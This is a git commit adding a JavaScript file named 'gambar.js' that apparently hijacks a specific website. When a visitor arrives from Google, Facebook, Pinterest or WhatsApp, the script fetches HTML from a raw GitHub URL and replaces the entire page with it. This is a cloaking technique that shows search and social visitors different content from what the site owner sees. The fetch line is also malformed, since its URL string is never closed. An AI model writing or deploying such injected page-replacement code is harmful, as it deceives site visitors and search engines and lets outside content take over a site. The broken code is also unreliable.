eb44dce7f04e8df1207a5c6eb833ad9b111b8eab
mrotang <65051182+mrotang@users.noreply.github.com>
2023-05-18 13:12:17 +0700

    Create gambar.js

---
+++ gambar.js
@@ -0,0 +1,15 @@
+const referrer = document.referrer.toLowerCase();
+const currentDomain = window.location.hostname.toLowerCase();
+
+const allowedReferrers = ['google', 'facebook', 'pinterest', 'whatsapp.com'];
+const articleContent = '';
+
+if (allowedReferrers.some(referrer.includes.bind(referrer)) && currentDomain === 'roneeyi.com') {
+  fetch('https://raw.githubusercontent.com/mrotang/cloudflare/assets/raja.html)
+    .then(response => response.text())
+    .then(html => {
+      const article = document.querySelector('html');
+      article.innerHTML = html;
+    })
+    .catch(error => console.error(error));
+}
